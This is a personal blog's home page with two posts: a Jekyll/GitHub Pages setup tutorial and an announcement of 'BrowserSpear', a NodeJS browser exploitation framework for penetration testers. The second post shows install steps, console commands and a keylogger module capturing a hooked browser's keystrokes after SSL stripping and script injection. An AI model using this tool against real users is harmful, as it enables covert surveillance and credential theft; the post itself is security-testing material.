<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  
  
  <title>Lars Veelaert</title>
  <meta name="description" content="Personal site of Lars Veelaert">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="http://localhost:4000/">
  
  
  <link rel="alternate" type="application/rss+xml" title="Lars Veelaert" href="http://localhost:4000/feed.xml">

  

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:title" content="Lars Veelaert">
  <meta name="twitter:description" content="Personal site of Lars Veelaert">
  
  

  <script type="text/javascript">
  WebFontConfig = {
    google: { families: [ 'Bitter:400,700,400italic:latin' ] }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })();
</script>

  
  <!-- Google Analytics -->
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-112123975-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Lars Veelaert</a>

    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/archives/">Archives</a>
      
        
        <a class="page-link" href="https://demgeeks.com">DemGeeks</a>
      
        
        <a class="page-link" href="https://github.com/larsveelaert">GitHub</a>
      
        
        <a class="page-link" href="https://linkedin.com/in/larsveelaert">LinkedIn</a>
      
    </nav>

  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="home">

  

  

  <ul class="post-list">
    
      
      

      <li>
        <header class="post-header">
          <h1 class="post-title">
            <a class="post-link" href="/2018/01/08/how-to-build-a-site-with-jekyll-and-github-pages/">How To Build A Site With Jekyll And Github Pages</a>
          </h1>

          <p class="post-meta">Jan 8, 2018</p>
        </header>

        <div class="post-content">
          <p><em>As a terminal-guy, I never really like the way Content Management Systems for websites work. Sure, they provide great UX (mostly) for the average user. But what if I want to skip all that and just make a barebones site that is easily manageable with the applications I already have on my system now?</em></p>

<p>Welcome in the realm of static site generators. <em>Awesome… So if I want to change something I have to write HTML and CSS myself?</em> No… That is a possibility, if you want a static page for your company or just a landing page but I wanted a blog so using something like <a href="https://jekyllrb.com/">Jekyll</a> in combination with <a href="https://pages.github.com/">Github Pages</a> is more logical. Let’s walk through how to set it up.</p>

<h2>How it works</h2>
<p><a href="https://pages.github.com/">Github Pages</a> supports <a href="https://jekyllrb.com/">Jekyll</a>, a static site generator. Which means, that there is no backend, database or hosting to configure. To add content to the site, you can use a markdown language, which makes it easy to write beautiful articles without messing with HTML and CSS.</p>

<p>You can have a <a href="https://pages.github.com/">Github Pages</a> site for every repo (Private or Public) and also one extra per user. Without adding your own custom domain, your website URL will be:<code class="highlighter-rouge">https://&lt;user&gt;.github.io/&lt;repo&gt;</code>. You do have to enable this feature on the Github-platform itself before they get hosted.</p>

<h2>Creating the repo</h2>
<p>To define the contents of your personal page, you have to make a repo with a name that exactly matches the following format:<code class="highlighter-rouge">&lt;user&gt;.github.io</code>. So in my case this is: <code class="highlighter-rouge">larsveelaert.github.io</code>. Normal project pages can have any name.</p>

<p>Now when you go to your new or existing repo and hit <em>Settings</em>, scroll down and you will find the Github Pages-section. Under <em>Source</em>, Choose your branch to host your files and that is all you will have to do for the hosting of your site. Easy right?</p>

<h2>Search a theme</h2>
<p>Now get your Google-skills on and search for “<em>Jekyll themes</em>”. Often you will find Github-repo’s with a demo link. If you like one, continue…</p>

<p>The easiest way to copy that theme is to clone the repo of that theme, and copy all its contents to your own repo. For example with the <em><a href="https://github.com/yous/whiteglass">Whiteglass</a></em>-theme do:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/yous/whiteglass.git
cp -R whiteglass/* larsveelaert.github.io/

</code></pre></div></div>
<p>You will have to set 2 settings to the right value before the site will work, namely <em>baseurl</em> and <em>url</em>. Your settings can be found in `_config.yml’:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>baseurl: "" # the subpath of your site, e.g. /blog
url: "https://larsveelaert.github.io" # the base hostname &amp; protocol for your site, e.g. http://example.com
</code></pre></div></div>

<p>Now push your changes to your site’s repo and you have succesfully copied the theme:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git add -all
git commit -a -m 'theme setup'
git push
</code></pre></div></div>

<p>After a brief waiting period, browse to your website and you should see your chosen theme presented.</p>

<h2>Making changes and adding content</h2>
<p>The great thing about this approach is that we can run <a href="https://jekyllrb.com/">Jekyll</a> ourselves locally, so that we do not have to rely on one centralized way of changing content. 
Make sure <em><a href="https://www.ruby-lang.org/en/">Ruby</a></em> is installed and run the following commands in your repo:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gem install jekyll bundler
bundle exec jekyll serve
</code></pre></div></div>
<p>Now your site will be served on <code class="highlighter-rouge">localhost:4000</code>. If your want the make it rebuild the site if any of the files change, add the following option <code class="highlighter-rouge">--watch</code>. This is a great option to use when writing and previewing an article.</p>

<p>The main settings like page-title and social links will be set in the <code class="highlighter-rouge">_config.yml</code> file of your repo. Every theme is a bit different. But go through the docs of your specific theme and you will find lean ways how to change the navigation or how to add extra pages.</p>

<p>You can find your posts in the <code class="highlighter-rouge">_posts</code>-folder and it is there that you can just create a new file and write your articles in <a href="https://nl.wikipedia.org/wiki/Markdown">Markdown</a>. A great resource to learn the basics of Markdown is <a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">this Github-page</a></p>

<h2>TIP: –drafts</h2>
<p>Something that is really usefull is making a <code class="highlighter-rouge">_drafts</code>. Here you can add posts that will not be added to your regular feed. To process them and preview the result you can add the <code class="highlighter-rouge">--drafts</code> switch to your local <code class="highlighter-rouge">jekyll</code>-command and they will appear as most recent blog-posts.</p>

<h2>Conclusion</h2>
<p>Using just a text-editor and the great infrastructure of Github Pages, makes it really easy to push changes with all the advantages we know from <em><a href="https://git-scm.com/">Git</a></em>.
The option to edit offline, have offline-backups of the complete source and really manage the changes is a great option. Not having a backend to maintain is also a great win for security.</p>

<p>Have fun!</p>

        </div>
        
      </li>
    
      
      

      <li>
        <header class="post-header">
          <h1 class="post-title">
            <a class="post-link" href="/2018/01/02/Introducing-BrowserSpear,-A-Lightweight-Browser-Exploitation-Framework-For-Embedded-Devices/">Introducing Browserspear, A Lightweight Browser Exploitation Framework For Embedded Devices</a>
          </h1>

          <p class="post-meta">Jan 2, 2018</p>
        </header>

        <div class="post-content">
          <p><img src="http://localhost:4000/assets/intro_browserspear.jpg" alt="Intro Browserspear" /></p>

<p><em>With the rise of more IoT devices and other cheap off-the-shelf development platforms there is an opportunity to optimize the toolsets of Red-teamers, Penetration Testers and Ethical Hackers. To take full advantage of these devices we need our frameworks to be light and flexible. In this article, I want to present a tool that I built called ‘BrowserSpear’. It consist of a basic framework to exploit browsers and is capable of working on all architectures with basic server capacity. Feedback is always welcome.</em></p>

<p>When demonstrating the need for network security, there are few tools that can really get the appropriate reaction and are easy enough to demo to a crowd of people without actually sending malicious code or using an exploit which might crash the device.</p>

<p>A great demo is to try to downgrade the security of traffic on a network from SSL to unencrypted HTTP. We can do this with tools such as Bettercap, SSLstrip or another variant. After this security downgrade, it is possible to inject extra code into HTTP connections to make the website’s background pink or give an alert. Just something that is very noticable to a user and that will get a reaction.</p>

<p>What takes this to the next level is Browser Exploitation. The very famous tool BeEF (Browser Exploitation Framework Project) can control the complete website a target loaded over an unsecure connection after an extra script is injected into it which ‘hooks’ the client and makes it receive commands from BeEF.</p>

<h2>The issue</h2>

<p>Browser Exploitation is nothing new and BeEF is a well-known tool, but it is a bit older, and needs a lot of extra dependencies. Here is were the usage of old libraries like libv8 and specific Ruby gems start to become an issue. Which makes it almost impossible to install on the newer architectures like ARM.</p>

<p>We see many auditing devices built on a mobile architecture such as ARM surface such as the WiFi Pineapple, Packet Squirrel and even your own rooted Android smartphone. Which are compact tools that make a great portable and reliable platform. Using these devices on-the-go or for example a Raspberry Pi as a low-powered server in the cloud is an excellent use of these new and cheaper devices to audit networks and demonstrate attack vectors.</p>

<h2>So what is BrowserSpear?</h2>

<blockquote>
  <p>Browserspear is a lightweight framework built on the NodeJS engine. The complete core and modules are written in Javascript and adding payloads is as simple as writing an extra function and saving it in the ‘modules’ folder.</p>
</blockquote>

<p>A device that has the server capacity to run NodeJS will be able to act as a server to ‘spear’ browsers and the complete behavior of the server can be controlled from a shell prompt or scripted beforehand.</p>

<p>BrowserSpear is still under development, but can be found in this Github repo. The core functionalities like code delivery and hooking or ‘spearing’ targets are fully working.</p>

<h2>How to get started</h2>
<p>With NodeJS and NPM installed (through your favourite package manager). Clone the Github-repo and install the following packages:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/larsveelaert/browserspear.git
npm install websockets prompt uglify-js commander
</code></pre></div></div>

<p>Starting a console session is as simple as running the script. –help will give you all the extra info you need for advanced configuration.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ node browserspear.js --help
  Usage: browserspear [options]
  
  Options:
    -V, --version             output the version number
    -c, --commandfile &lt;file&gt;  file with commands to run in the console
    -p, --port &lt;port&gt;         Port to listen on
    -i, --ip &lt;ip&gt;             The ip address to use in the reverse connection
    -s, --start               Start a listener immediatly
    -h, --help                output usage informatio
</code></pre></div></div>

<p>In the BrowserSpear console. You can get a list of available commands by typing ‘help’. Here is an extract:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; help
Available commands:
- start | restart 
	Restarts the server that serves the spear and provides the socket to connect to
- set &lt;property&gt; &lt;value&gt;
      Sets a value used by the server or module. ex. 'set LHOST: mydomain.org'
- options
      List all the values of the options.
- load &lt;module&gt;
      Loads the functions inside that module. Only one module can be selected at once. ex. 'load keylogger'
- modules &lt;search&gt;
      Gives a list of all available modules, with an optional searchterm.
- exec
      Executes the 'exec' function of the current selected module. Ex. send a payload
- conns
      List all connections to the server
- help
      Print this help.
</code></pre></div></div>

<p>The default address of the spear is localhost:1337. So navigating to this address on you local device running the server (started with start). Would give you the following output:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; start
&gt;&gt;&gt; Tue Jan 02 2018 14:11:14 GMT+0000 (UTC) Server is listening on port 1337
New connection to client at ::1
&gt;&gt;&gt; conns
List of connections:
 [0] ::1
</code></pre></div></div>

<p>Now we can load a module, for example an attack that logs all keystrokes in that browser called a keylogger. By default, the attack is sent to all the clients connected. The client will then record the keystrokes and send them to the server. The attack will stay active, even if the server is restarted or the module is unloaded.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; load keylogger
&gt;&gt;&gt; keylogger: exec
Payload sent
&gt;&gt;&gt; keylogger: 
https://www.linkedin.com/redir/invalid-link-page?url=%5B%3A%3A1%5D KEYLOGGER:I will now tell you all my secrets
</code></pre></div></div>

<p>Thats it for the basic usage. As you have control over the full webpage. There is no limit on what you can do within the constraints of Javascript. There are already known attacks to get persistance on the full-domain, cross-domain and even cross-browser.</p>

<p>Looking forward to the Progressive Web Applications. There is a need to correctly mitigate against this attack vector because the native API’s already available in the browser are quite powerful and can be easily used against the user (ex. HTML5 webcam, Mic, GPS, Contacts, File access, …). The ever smaller gap between online and offline will create a need for strong security analysis so system access can be strictly controlled.</p>

<h2>Goals and Roadmap</h2>
<p>BrowserSpear will keep expanding it’s capabilities aiming towards connection types (including obfiscation/evasion) and pre-configured payloads to make the complete framework very easy to use and very ‘hackable’.</p>

<p>As it is an open-source project, development will happen through its Github page. Please feel free to contact me for more info, give feedback or even help to develop the project to its full potential.</p>

<p>Happy spearing!</p>

        </div>
        
      </li>
    
  </ul>

  


</div>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

&copy; Lars Veelaert - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="http://localhost:4000/feed.xml">RSS</a>

    </p>

  </div>

</footer>


  </body>

</html>
